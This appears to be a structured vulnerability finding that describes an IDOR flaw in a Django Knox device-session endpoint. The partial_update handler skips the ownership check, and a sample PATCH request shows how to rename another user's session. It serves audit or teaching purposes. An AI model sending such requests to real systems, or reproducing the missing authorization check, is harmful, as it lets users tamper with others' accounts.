diagnosis: DeviceSessionMetaViewSet allows updating device metadata linked to a Knox authentication token. However, partial_update queries DeviceSessionMeta.objects.get(auth_token_id=pk) without verifying that session_meta.auth_token.user matches request.user. Any authenticated user can modify device nicknames and client identifiers for other users' active sessions.
exploit_request:
PATCH /api/auth/device-sessions/304/ HTTP/1.1
Host: auth.saasapp.com
Authorization: Token 10e3d2...
Content-Type: application/json

{"device_name": "Attacker-Controlled Device"}
